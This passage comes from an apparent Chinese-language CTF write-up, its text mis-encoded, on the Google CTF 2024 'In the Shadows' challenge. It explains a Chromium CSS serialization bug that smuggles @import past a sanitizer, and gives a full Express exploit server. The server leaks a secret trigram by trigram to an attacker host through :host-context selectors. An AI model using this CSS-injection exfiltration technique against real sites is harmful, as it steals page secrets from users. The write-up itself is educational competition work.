çš„æ›¿ä»£ç”¨æ³•ï¼Œä½†æ²’ä½œç”¨ï¼Œçœ‹ä¾†é‚„æ²’å¯¦ä½œï¼‰</p><p>å°±ç®—çœŸçš„èƒ½åšåˆ°ï¼Œé‚„æœ‰å¦ä¸€å€‹å•é¡Œï¼Œé‚£å°±æ˜¯å­—å…ƒå¤ªå¤šå°è‡´é‡è¤‡ç‡å¤ªé«˜ã€‚</p><p>secret æœ‰ 112 å€‹å­—ï¼Œå› æ­¤å¦‚æœæ˜¯ bigramï¼Œæœƒæœ‰ 111 çµ„ï¼Œä½†æˆ‘æ¸¬äº†å¹¾éï¼Œèƒ½æœ‰ 93 çµ„å°±å·²ç¶“å¾ˆé›£äº†ï¼Œä»£è¡¨èªªæœ‰ 18 çµ„éƒ½æ˜¯é‡è¤‡çš„ã€‚å› æ­¤ï¼Œå°±å¿…é ˆ brute-force ä¸€ä¸‹ï¼Œä½†æ˜¯ C(93, 18) &#x3D; 7282746847637522000ï¼Œæ€éº¼çœ‹éƒ½ä¸åƒæ˜¯å€‹å¯ä»¥æš´åŠ›æœå°‹çš„æ•¸å­—ã€‚</p><p>å› æ­¤ï¼Œé€™å€‹æ–¹å‘å¾ˆå¯èƒ½æ˜¯éŒ¯çš„ï¼Œæ²’è¾¦æ³•ã€‚</p><p>é‚£é‚„æœ‰ä»€éº¼æ–¹å‘å‘¢ï¼Ÿå¦ä¸€å€‹æ–¹å‘æ˜¯åˆ©ç”¨ç¾æœ‰çš„æ©Ÿåˆ¶ä¾†ç¹éæª¢æŸ¥ã€‚</p><p>sanitizer æœ€å¾Œæœƒå›å‚³ safeCssï¼Œæ˜¯ç”±æ¯ä¸€å€‹ rule çš„ cssText çµ„æˆçš„ï¼Œå¦‚æœå¯ä»¥è®“æœ€å¾Œçš„ cssText æœ‰ <code>@impor\74</code> ä¹‹é¡çš„å­—å…ƒï¼Œå°±èƒ½å¤ ç¹éæœ€å¾Œçš„æª¢æŸ¥ã€‚</p><p>ç„¶å¾ŒéšŠå‹å°±ç™¼ç¾äº† <code>@font-feature-values &#39;lol &#123;&#125;; @import &quot;lol.com&quot;;p&#39;</code> åœ¨å–å‡º cssText å¾Œï¼Œæœƒç›´æ¥æŠŠå–®å¼•è™Ÿçµ¦å»æ‰ã€‚è€Œå»æ‰å¼•è™Ÿä¹‹å¾Œï¼Œå¾ˆé¡¯ç„¶ CSS çš„æ„æ€å°±æ”¹è®Šäº†ã€‚</p><p>æ ¹æ“šé€™é»ï¼Œå°±å¯ä»¥çµ¦ä¸€å€‹é€™æ¨£çš„ inputï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token atrule"><span class="token rule">@font-feature-values</span> <span class="token string">'lol; @\\0069mport "//exp.com";p'</span></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å–å‡º cssText å¾Œæœƒè®Šæˆï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  @font-feature-values 'lol<span class="token punctuation">;</span>  @\0069mport <span class="token string">"//exp.com"</span><span class="token punctuation">;</span>  <span class="token selector">p</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆåŠŸå·æ¸¡äº† <code>@import</code> é€²å»ï¼Œæ¥è‘—å°±å¯ä»¥ç”¨å¸¸è¦‹çš„æ–¹å¼å»æŠŠå­—å…ƒ leak å‡ºä¾†äº†ã€‚</p><p>èªªåˆ°é€™å€‹ï¼Œæ„Ÿè¦ºæ‡‰è©²è¦æº–å‚™ä¸€å€‹å¯ä»¥éš¨é–‹å³ç”¨çš„ CSS injection serverï¼Œå¦å‰‡æ¯æ¬¡éƒ½è¦å¾é ­å†å¯«ä¸€å€‹æœ‰é»ç´¯ã€‚</p><p>é€™æ¬¡æˆ‘æ˜¯ç›´æ¥ç”¨ä¸Šæ¬¡ <a href="https://blog.huli.tw/2023/12/11/0ctf-2023-writeup/">0CTF 2023</a> å¯«çš„ trigramï¼Œä½†æ˜¯æœ‰é» buggyï¼Œåœ¨æŠŠå­—å…ƒçµ„å›å»é‚£é‚Šæ²’æœ‰è€ƒæ…®å¥½ï¼Œè¦è·‘å¾ˆå¤šæ¬¡è€Œä¸”é‹æ°£å¥½æ‰èƒ½å¾—åˆ°æ­£è§£ã€‚</p><p>åœ¨é‚Šå˜—è©¦é‚Šä¿®çš„ç‹€æ…‹ä¸‹å¼„äº†ä¸€å€‹å°æ™‚ï¼Œé‹æ°£å¾ˆå¥½çš„æ‹¿åˆ° flagã€‚</p><p>è©±èªªæ ¹æ“š Discord çš„è³½å¾Œè¨è«–ï¼Œé€™ bug åœ¨è¿‘æœŸè¢«ä¿®æ‰äº†ï¼š<a href="https://chromium-review.googlesource.com/c/chromium/src/+/5604769">Properly escape CSS identifiers in serialization.</a></p><p>æœ€å¾Œé™„ä¸Šå®Œæ•´ä½†ä¸ç©©å®šçš„ exploitï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">5555</span><span class="token keyword">let</span> leaks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">const</span> <span class="token constant">BASE</span> <span class="token operator">=</span> <span class="token string">'https://your_server.com'</span><span class="token comment">// prepare payload</span><span class="token keyword">let</span> chars <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> a <span class="token keyword">of</span> chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> b <span class="token keyword">of</span> chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> c <span class="token keyword">of</span> chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> str <span class="token operator">=</span> a<span class="token operator">+</span>b<span class="token operator">+</span>c<span class="token punctuation">;</span>            arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> payload1 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">let</span> crossPayload1 <span class="token operator">=</span> <span class="token string">'url("/")'</span><span class="token keyword">let</span> payload2 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">let</span> crossPayload2 <span class="token operator">=</span> <span class="token string">'url("/")'</span><span class="token keyword">let</span> payload3 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">let</span> crossPayload3 <span class="token operator">=</span> <span class="token string">'url("/")'</span><span class="token keyword">const</span> third <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> arr1 <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> third<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">const</span> arr2 <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>third<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> third<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">const</span> arr3 <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> third<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> str <span class="token keyword">of</span> arr1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    payload1 <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">:host-context(*[secret*="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"])&#123;--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:url("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">BASE</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/leak?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">")&#125;\n</span><span class="token template-punctuation string">`</span></span>    crossPayload1 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">-webkit-cross-fade(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, var(--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, none), 50%)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> str <span class="token keyword">of</span> arr2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    payload2 <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">:host-context(*[secret*="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"])&#123;--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:url("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">BASE</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/leak?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">")&#125;\n</span><span class="token template-punctuation string">`</span></span>    crossPayload2 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">-webkit-cross-fade(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, var(--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, none), 50%)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> str <span class="token keyword">of</span> arr3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    payload3 <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">:host-context(*[secret*="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"])&#123;--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:url("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">BASE</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/leak?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">")&#125;\n</span><span class="token template-punctuation string">`</span></span>    crossPayload3 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">-webkit-cross-fade(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload3<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, var(--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, none), 50%)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">&#125;</span>payload1 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>payload1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> .p1&#123;background-image:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> &#125;</span><span class="token template-punctuation string">`</span></span>payload2 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>payload2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> .p2&#123;background-image:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> &#125;</span><span class="token template-punctuation string">`</span></span>payload3 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>payload3<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> .p3&#123;background-image:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload3<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> &#125;</span><span class="token template-punctuation string">`</span></span><span class="token keyword">function</span> <span class="token function">filterFirst</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span> item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> found <span class="token operator">=</span> <span class="token boolean">false</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> a <span class="token keyword">of</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">===</span>item <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>found<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      found <span class="token operator">=</span> <span class="token boolean">true</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">&#125;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token parameter">secret</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://in-the-shadows-web.2024.ctfcompetition.com/check-secret?secret='</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>text <span class="token operator">!==</span> <span class="token string">'Invalid secret'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">err</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'err'</span><span class="token punctuation">,</span> err<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span> ending</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> ending  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ending<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> isFound <span class="token operator">=</span> <span class="token boolean">false</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> j<span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">let</span> suffix <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>         <span class="token keyword">let</span> prefix <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>suffix <span class="token operator">===</span> prefix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          isFound <span class="token operator">=</span> <span class="token boolean">true</span>          <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isFound<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ending:'</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span><span class="token function">filterFirst</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Error, please try again'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> found <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> length <span class="token operator">=</span> ending<span class="token punctuation">.</span>length    <span class="token keyword">let</span> suffix <span class="token operator">=</span> ending<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> ending<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">let</span> prefix <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>suffix <span class="token operator">===</span> prefix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      found<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">filterFirst</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> ending<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> found<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">handleLeak</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">''</span>  <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>leaks<span class="token punctuation">]</span>  leaks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'received:'</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> merged <span class="token operator">=</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'leaked:'</span><span class="token punctuation">,</span> merged<span class="token punctuation">.</span><span class="token function">flat</span><span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> merged<span class="token punctuation">.</span><span class="token function">flat</span><span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/leak'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  leaks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q<span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'recevied:'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q<span class="token punctuation">,</span> leaks<span class="token punctuation">.</span>length<span class="token punctuation">)</span>  <span class="token comment">//console.log(leaks)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>leaks<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">105</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token function">handleLeak</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">let</span> s <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'000'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'secret:'</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span>    <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> f <span class="token keyword">of</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'try:'</span><span class="token punctuation">,</span> f<span class="token punctuation">,</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>      <span class="token keyword">await</span> <span class="token function">getFlag</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'000'</span><span class="token punctuation">,</span> <span class="token string">'00000000'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'ok'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/payload1'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'payload1'</span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/css'</span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/payload2'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'payload2'</span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/css'</span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/payload3'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token 